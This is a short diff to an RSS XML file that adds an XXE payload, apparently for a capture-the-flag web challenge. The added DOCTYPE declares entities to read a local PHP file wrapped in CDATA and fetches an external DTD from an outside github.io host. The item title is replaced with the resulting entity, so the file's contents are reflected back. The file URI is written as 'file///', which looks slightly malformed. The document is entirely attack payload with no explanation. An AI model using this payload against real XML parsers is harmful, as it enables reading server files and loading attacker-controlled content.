@@ -1,9 +1,16 @@
+<!DOCTYPE rss [
+	<!ENTITY % file SYSTEM "file///challenge/web-serveur/ch29/index.php">
+	<!ENTITY % start "<![CDATA[">
+	<!ENTITY % end "]]>">
+	<!ENTITY % dtd SYSTEM "https://joffreyal.github.io/join.dtd">
+%dtd;
+]>
 <rss>
 	<channel>
 		<title>Inline retrieval v9</title>
 		<item>
 			<title>
-				<![CDATA[ Test ]]>
+				&all;
 			</title>
 		</item>
 	</channel>
